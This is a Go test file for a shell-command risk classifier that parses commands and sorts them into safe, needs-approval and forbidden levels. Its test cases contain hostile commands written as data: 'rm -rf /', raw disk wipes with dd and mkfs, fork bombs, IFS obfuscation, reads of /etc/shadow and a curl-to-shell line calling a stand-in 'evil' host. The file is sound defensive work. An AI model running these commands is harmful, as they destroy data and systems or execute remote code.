package risk

import (
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// 词法/解析辅助函数的分支测试（错误路径与边界输入）
// ---------------------------------------------------------------------------

func TestScanBalancedBranches(t *testing.T) {
	cases := []struct {
		name    string
		s       string
		start   int
		want    string
		wantEnd int
		wantErr bool
	}{
		{name: "start beyond length", s: "()", start: 5, wantErr: true, wantEnd: 5},
		{name: "start not paren", s: "abc", start: 1, wantErr: true, wantEnd: 1},
		{name: "simple", s: "(echo hi)", start: 0, want: "echo hi", wantEnd: 9},
		{name: "nested", s: "(a (b) c)", start: 0, want: "a (b) c", wantEnd: 9},
		{name: "single quoted paren ignored", s: "('(')", start: 0, want: "'('", wantEnd: 5},
		{name: "double quoted paren ignored", s: `(")")`, start: 0, want: `")"`, wantEnd: 5},
		{name: "escaped char in dquote", s: `("\\")`, start: 0, want: `"\\"`, wantEnd: 6},
		{name: "backslash outside quote", s: `(a\))`, start: 0, want: `a\)`, wantEnd: 5},
		{name: "unbalanced", s: "(echo", start: 0, wantErr: true, wantEnd: 5},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, end, err := scanBalanced(tc.s, tc.start)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("scanBalanced(%q,%d) = %q,%d,nil, want error", tc.s, tc.start, got, end)
				}
				return
			}
			if err != nil {
				t.Fatalf("scanBalanced(%q,%d) error: %v", tc.s, tc.start, err)
			}
			if got != tc.want || end != tc.wantEnd {
				t.Fatalf("scanBalanced(%q,%d) = %q,%d, want %q,%d", tc.s, tc.start, got, end, tc.want, tc.wantEnd)
			}
		})
	}
}

func TestScanBacktickBranches(t *testing.T) {
	got, end, err := scanBacktick("a`echo`b", 1)
	if err != nil || got != "echo" || end != 7 {
		t.Fatalf("scanBacktick = %q,%d,%v, want echo,7,nil", got, end, err)
	}
	// 反斜杠转义的反引号不终止扫描。
	got, end, err = scanBacktick("`a\\`b`", 0)
	if err != nil || got != "a\\`b" || end != 6 {
		t.Fatalf("scanBacktick escaped = %q,%d,%v", got, end, err)
	}
	if _, _, err := scanBacktick("`unterminated", 0); err == nil {
		t.Fatal("unterminated backtick must error")
	}
}

func TestParseRedirectOpBranches(t *testing.T) {
	cases := []struct {
		s       string
		start   int
		wantOp  string
		wantIdx int
	}{
		{"", 0, "", 0},
		{"a", 0, "", 0},
		{">", 0, ">", 1},
		{"<", 0, "<", 1},
		{">>/log", 0, ">>", 2},
		{"<<EOF", 0, "<<", 2},
		{"<<<hi", 0, "<<<", 3},
		{">|f", 0, ">|", 2},
		{"<>f", 0, "<>", 2},
		{"&>f", 0, "", 0}, // '&' 开头不是重定向操作符
		{"2>&1", 1, ">&", 3},
	}
	for _, tc := range cases {
		op, idx := parseRedirectOp(tc.s, tc.start)
		if op != tc.wantOp || idx != tc.wantIdx {
			t.Errorf("parseRedirectOp(%q,%d) = %q,%d, want %q,%d", tc.s, tc.start, op, idx, tc.wantOp, tc.wantIdx)
		}
	}
}

func TestCollectSubstitutionsBranches(t *testing.T) {
	// 反引号替换。
	subs, err := collectSubstitutions("echo `id`")
	if err != nil || len(subs) != 1 || subs[0] != "id" {
		t.Fatalf("backtick subs = %v, %v", subs, err)
	}
	// $() 替换。
	subs, err = collectSubstitutions("echo $(whoami)")
	if err != nil || len(subs) != 1 || subs[0] != "whoami" {
		t.Fatalf("$() subs = %v, %v", subs, err)
	}
	// 反斜杠跳过其后一个字符（`x\`y` 的反引号被转义）。
	subs, err = collectSubstitutions("echo x\\`id\\`")
	if err != nil || len(subs) != 0 {
		t.Fatalf("escaped subs = %v, %v", subs, err)
	}
	// $((1+$(id)))：scanBalanced 从首个 '(' 配对，整体作为一层替换返回。
	subs, err = collectSubstitutions("$((1+$(id)))")
	if err != nil || len(subs) != 1 || subs[0] != "(1+$(id))" {
		t.Fatalf("arith nested subs = %v, %v", subs, err)
	}
	if _, err := collectSubstitutions("$(unbalanced"); err == nil {
		t.Fatal("unbalanced $() must error")
	}
	if _, err := collectSubstitutions("`unterminated"); err == nil {
		t.Fatal("unterminated backtick must error")
	}
}

func TestReadRedirectTargetBranches(t *testing.T) {
	// 普通目标。
	target, subs, end, err := readRedirectTarget("> /tmp/f", 1)
	if err != nil || target != "/tmp/f" || len(subs) != 0 || end != len("> /tmp/f") {
		t.Fatalf("plain target = %q,%v,%d,%v", target, subs, end, err)
	}
	// 目标位置直接是分隔符：零消费保护必须报错（历史死循环回归）。
	if _, _, _, err := readRedirectTarget(">;", 1); err == nil {
		t.Fatal("separator at target position must error")
	}
	// 单引号目标。
	target, _, _, err = readRedirectTarget("> '/tmp/a b'", 1)
	if err != nil || target != "/tmp/a b" {
		t.Fatalf("quoted target = %q, %v", target, err)
	}
	// 双引号内命令替换。
	target, subs, _, err = readRedirectTarget(`> "$(id)"`, 1)
	if err != nil || len(subs) != 1 || subs[0] != "id" || target != "$(id)" {
		t.Fatalf("dquote subst target = %q,%v,%v", target, subs, err)
	}
	// here-string 中的 $() 同样被收集。
	_, subs, _, err = readRedirectTarget("<<< $(cat /etc/passwd)", 4)
	if err != nil || len(subs) != 1 || subs[0] != "cat /etc/passwd" {
		t.Fatalf("herestring subst = %v, %v", subs, err)
	}
	// 双引号内算术展开：写回原文，不作为命令替换。
	target, subs, _, err = readRedirectTarget(`> "$((1+1))"`, 1)
	if err != nil || len(subs) != 0 || target != "$((1+1))" {
		t.Fatalf("arith in dquote = %q,%v,%v", target, subs, err)
	}
	// 反引号替换。
	_, subs, _, err = readRedirectTarget("> `id`", 1)
	if err != nil || len(subs) != 1 || subs[0] != "id" {
		t.Fatalf("backtick target = %v, %v", subs, err)
	}
	// 未闭合替换报错。
	if _, _, _, err = readRedirectTarget("> $(x", 1); err == nil {
		t.Fatal("unbalanced subst in target must error")
	}
	// 裸 $ 后不是 '('：按普通字符处理。
	target, _, _, err = readRedirectTarget("> $f", 1)
	if err != nil || target != "$f" {
		t.Fatalf("variable target = %q, %v", target, err)
	}
	// 末尾孤立反斜杠。
	target, _, _, err = readRedirectTarget("> a\\", 1)
	if err != nil || target != "a" {
		t.Fatalf("trailing backslash target = %q, %v", target, err)
	}
}

func TestIsAllDigitsBranches(t *testing.T) {
	if isAllDigits("") {
		t.Fatal("empty string is not all digits")
	}
	if !isAllDigits("007") {
		t.Fatal("007 should be all digits")
	}
	if isAllDigits("7a") {
		t.Fatal("7a is not all digits")
	}
}

func TestIsShellIdentBranches(t *testing.T) {
	cases := []struct {
		s    string
		want bool
	}{
		{"", false},
		{"1abc", false}, // 首字符是数字
		{"-abc", false}, // 首字符是 '-'
		{".abc", false}, // 首字符是 '.'
		{"a-b", true},   // 非首字符 '-'
		{"a.b", true},   // 非首字符 '.'
		{"a1", true},    // 非首字符数字
		{"_x", true},    // 下划线
		{"a b", false},  // 空白
		{"中文", false},   // 非 ASCII 标识符
	}
	for _, tc := range cases {
		if got := isShellIdent(tc.s); got != tc.want {
			t.Errorf("isShellIdent(%q) = %v, want %v", tc.s, got, tc.want)
		}
	}
}

func TestIsForkBombVariants(t *testing.T) {
	cases := []struct {
		compact string
		want    bool
	}{
		{":(){:|:&};:", true},
		{"f(){f|f&};f", true},      // 任意函数名自调用
		{"f(){f&|f};f", true},      // 反序变体
		{"f(){echox|f&};f", false}, // 体内不自调用
		{"f(){f|f&}", false},       // 缺少 };
		{"(){a|a&};a", false},      // 函数名为空
		{"1(){1|1&};1", false},     // 函数名不是标识符
		{"ls-lf(){x|y&};z", false}, // 名称带 '-' 时首段不是标识符的情况由 '-' 规则覆盖
		{"plain command", false},
	}
	for _, tc := range cases {
		if got := isForkBomb(tc.compact); got != tc.want {
			t.Errorf("isForkBomb(%q) = %v, want %v", tc.compact, got, tc.want)
		}
	}
}

func TestCleanTargetBranches(t *testing.T) {
	if got := cleanTarget(`"/tmp/a b"`); got != "/tmp/a b" {
		t.Fatalf("quoted = %q", got)
	}
	if got := cleanTarget("'$HOME'"); got != "$HOME" {
		t.Fatalf("variable preserved = %q", got)
	}
	if got := cleanTarget("~/x"); got != "~/x" {
		t.Fatalf("tilde preserved = %q", got)
	}
	if got := cleanTarget("  /a//b/../c "); got != "/a/c" {
		t.Fatalf("cleaned = %q", got)
	}
	if got := cleanTarget(`"x`); got != `"x` {
		t.Fatalf("unbalanced quote kept = %q", got)
	}
	if got := cleanTarget("   "); got != "" {
		t.Fatalf("blank = %q", got)
	}
}

func TestNormalizeErrorPaths(t *testing.T) {
	if _, err := normalize("echo 'unterminated"); err == nil {
		t.Fatal("unterminated single quote must error")
	}
	if _, err := normalize(`echo "unterminated`); err == nil {
		t.Fatal("unterminated double quote must error")
	}
	// NFKC 膨胀超过上限：全角连字重复撑爆 16384 字节。
	inflated := strings.Repeat("ＦＩ", 9000) // NFKC 每字符展开 2 字节
	if _, err := normalize(inflated); err == nil {
		t.Fatal("expansion over MaxCommandBytes must error")
	}
}

// ---------------------------------------------------------------------------
// Classify 级别的分支补充（kubectl/ssh/service/ip/systemctl/包装器/SQL CLI）
// ---------------------------------------------------------------------------

func TestClassifyUncoveredCommandFamilies(t *testing.T) {
	cases := []struct {
		name      string
		command   string
		wantLevel Level
		wantRule  string
	}{
		// kubectl
		{"kubectl delete", "kubectl delete pod api", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"kubectl apply", "kubectl apply -f x.yaml", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"kubectl scale", "kubectl scale --replicas=0 deploy/api", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"kubectl rollout", "kubectl rollout restart deploy/api", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"kubectl exec shell -c", "kubectl exec pod1 -- sh -c 'rm -rf /'", LevelForbidden, "RM_PROTECTED"},
		{"kubectl exec plain", "kubectl exec pod1 -- ls", LevelNeedsApproval, "DEFAULT_ASK"},
		{"kubectl top", "kubectl top pods", LevelNeedsApproval, "DEFAULT_ASK"},

		// ssh
		{"ssh no destination", "ssh -p 2222", LevelNeedsApproval, "NESTED_SSH"},
		{"ssh options then remote command", "ssh -i /k -p 22 host.example uptime", LevelNeedsApproval, "NESTED_SSH"},
		{"ssh remote destructive", "ssh host.example rm -rf /", LevelForbidden, "RM_PROTECTED"},

		// service
		{"service only name", "service sshd", LevelNeedsApproval, "DEFAULT_ASK"},
		{"service status", "service ssh status", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"service stop critical", "service ssh stop", LevelForbidden, "CRITICAL_SERVICE_STOP"},
		{"service reversed order", "service stop networking", LevelForbidden, "CRITICAL_SERVICE_STOP"},
		{"service start", "service nginx start", LevelNeedsApproval, "SERVICE_CHANGE"},

		// systemctl
		{"systemctl poweroff", "systemctl poweroff", LevelForbidden, "POWER"},
		{"systemctl stop critical", "systemctl stop sshd", LevelForbidden, "CRITICAL_SERVICE_STOP"},
		{"systemctl disable timer", "systemctl disable logrotate.timer", LevelNeedsApproval, "CRON_CHANGE"},
		{"systemctl enable timer", "systemctl enable backup.timer", LevelNeedsApproval, "CRON_CHANGE"},
		{"systemctl restart", "systemctl restart nginx", LevelNeedsApproval, "SERVICE_CHANGE"},
		{"systemctl unknown verb", "systemctl isolate multi-user.target", LevelNeedsApproval, "DEFAULT_ASK"},
		{"systemctl status", "systemctl status nginx", LevelSafe, "SAFE_SYSTEM_STATUS"},

		// ip
		{"ip no args", "ip", LevelNeedsApproval, "DEFAULT_ASK"},
		{"ip addr add", "ip addr add 10.0.0.1/24 dev eth0", LevelNeedsApproval, "NETWORK_CHANGE"},
		{"ip a flush", "ip a flush dev eth0", LevelNeedsApproval, "NETWORK_CHANGE"},
		{"ip r alias", "ip r show", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"ip link set", "ip link set eth0 up", LevelNeedsApproval, "NETWORK_CHANGE"},
		{"ip unknown object", "ip netns list", LevelNeedsApproval, "DEFAULT_ASK"},

		// ss 参数级危险
		{"ss kill long", "ss --kill state established", LevelNeedsApproval, "DEFAULT_ASK"},
		{"ss kill short", "ss -K state established", LevelNeedsApproval, "DEFAULT_ASK"},

		// SQL CLI
		{"mysql drop", "mysql -e 'DROP TABLE t'", LevelForbidden, "SQL_DESTRUCTIVE"},
		{"mysql delete no where", "mysql -e 'DELETE FROM t'", LevelForbidden, "SQL_DESTRUCTIVE"},
		{"mysql delete with where", "mysql -e 'DELETE FROM t WHERE id=1'", LevelNeedsApproval, "SQL_WRITE"},
		{"mysql insert", "mysql -e 'INSERT INTO t VALUES(1)'", LevelNeedsApproval, "SQL_WRITE"},
		{"mysql select", "mysql -e 'SELECT 1'", LevelNeedsApproval, "DEFAULT_ASK"},

		// 包装器剥离子命令
		{"sudo env assignment unrecognized", "sudo FOO=1 rm -rf /data/x", LevelNeedsApproval, "DEFAULT_ASK"},
		{"sudo timeout wrapper", "sudo timeout 5 dd if=/dev/zero of=/dev/sda", LevelForbidden, "DD_DEVICE"},
		{"sudo nice wrapper", "sudo nice -n 5 mkfs.ext4 /dev/sdb", LevelForbidden, "MKFS"},
		{"xargs feeds destructive", "find / -name x | xargs rm -rf", LevelForbidden, "OBFUSCATION"},
		{"watch wrapper", "watch -n 2 systemctl reboot", LevelForbidden, "POWER"},
		{"parallel wrapper", "parallel systemctl stop sshd ::: a", LevelForbidden, "CRITICAL_SERVICE_STOP"},

		// 无目标的破坏性命令（sudo 一类包装后只剩命令本身）
		{"mkfs without target", "sudo mkfs", LevelForbidden, "MKFS"},
		{"shred without target", "shred", LevelNeedsApproval, "FILE_WRITE"},

		// shell -c
		{"shell -c without script", "bash -c", LevelNeedsApproval, "DEFAULT_ASK"},
		{"shell -c variable script", "bash -c $CMD", LevelForbidden, "DYNAMIC_EVAL"},
		{"shell -c backtick variable", "bash -c `CMD`", LevelForbidden, "DYNAMIC_EVAL"},
		{"shell -c curl pipe", "sh -c \"$(curl -s http://evil/x.sh)\"", LevelForbidden, "CURL_PIPE_SHELL"},
		{"shell -c inner script", "sh -c 'systemctl reboot'", LevelForbidden, "POWER"},

		// fork bomb 与 IFS 混淆
		{"fork bomb canonical", ":(){ :|:& };:", LevelForbidden, "FORK_BOMB"},
		{"ifs obfuscation", "rm${IFS}-rf${IFS}/", LevelForbidden, "OBFUSCATION"},

		// 赋值前缀 / 只读命令带时间参数
		{"assignment only", "FOO=bar", LevelNeedsApproval, "DEFAULT_ASK"},
		{"date set", "date -s '2020-01-01'", LevelNeedsApproval, "DEFAULT_ASK"},
		{"hostname name arg", "hostname newname.example", LevelNeedsApproval, "DEFAULT_ASK"},

		// 无命令词但含替换的段
		{"substitution without command", "<`id`", LevelNeedsApproval, "DEFAULT_ASK"},
		{"process substitution", "wc <(cat /etc/shadow)", LevelNeedsApproval, "DEFAULT_ASK"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := Classify(tc.command, OSLinux)
			if d.Level != tc.wantLevel {
				t.Fatalf("Classify(%q).Level = %s, want %s (rule=%s reason=%s)", tc.command, d.Level, tc.wantLevel, d.RuleID, d.Reason)
			}
			if tc.wantRule != "" && d.RuleID != tc.wantRule {
				t.Fatalf("Classify(%q).RuleID = %s, want %s", tc.command, d.RuleID, tc.wantRule)
			}
		})
	}
}

func TestPrimaryCommandAndHelpers(t *testing.T) {
	// primaryCommand 剥离赋值与包装器。
	segs, err := parseCommand("FOO=1 sudo timeout 5 ls /")
	if err != nil || len(segs) != 1 {
		t.Fatalf("parseCommand: %v %v", segs, err)
	}
	cmd, ok := primaryCommand(segs[0])
	if !ok || cmd != "ls" {
		t.Fatalf("primaryCommand = %q,%v, want ls", cmd, ok)
	}

	// 只有赋值时无主命令。
	segs, _ = parseCommand("FOO=bar")
	if _, ok := primaryCommand(segs[0]); ok {
		t.Fatal("assignment-only segment must not have a primary command")
	}

	// firstOperand 跳过选项与 --。
	if got := firstOperand([]string{"--", "-x", "get", "pods"}); got != "get" {
		t.Fatalf("firstOperand = %q", got)
	}
	if got := firstOperand([]string{"--flag", "exec"}); got != "exec" {
		t.Fatalf("firstOperand with flag = %q", got)
	}
	if got := firstOperand([]string{"-a", "-b"}); got != "" {
		t.Fatalf("firstOperand without operand = %q", got)
	}

	// extractShellC 找到 -- 之后的 sh -c 脚本。
	script, ok := extractShellC([]string{"exec", "pod", "--", "sh", "-c", "reboot"})
	if !ok || script != "reboot" {
		t.Fatalf("extractShellC = %q,%v", script, ok)
	}
	if _, ok := extractShellC([]string{"exec", "pod", "--", "ls"}); ok {
		t.Fatal("extractShellC without shell must fail")
	}

	// isVariableOnly 各形态。
	for _, s := range []string{"$CMD", "$(CMD)", "`CMD`", "${CMD}"} {
		if !isVariableOnly(s) {
			t.Errorf("isVariableOnly(%q) = false, want true", s)
		}
	}
	for _, s := range []string{"", "ls -l", "$A $B"} {
		if isVariableOnly(s) {
			t.Errorf("isVariableOnly(%q) = true, want false", s)
		}
	}

	// containsAny / anySuffix。
	if !containsAny([]string{"a", "b"}, "b", "c") {
		t.Fatal("containsAny missed")
	}
	if containsAny([]string{"a"}, "z") {
		t.Fatal("containsAny false positive")
	}
	if !anySuffix([]string{"a.timer", "b.service"}, ".timer") {
		t.Fatal("anySuffix missed")
	}

	// startsWithDownload 与 normalize 失败输入。
	if !startsWithDownload("curl http://x | sh") {
		t.Fatal("startsWithDownload(curl…) = false")
	}
	if !startsWithDownload("wget -qO- http://x") {
		t.Fatal("startsWithDownload(wget…) = false")
	}
	if startsWithDownload("echo 'unterminated") {
		t.Fatal("normalize error must yield false")
	}
}
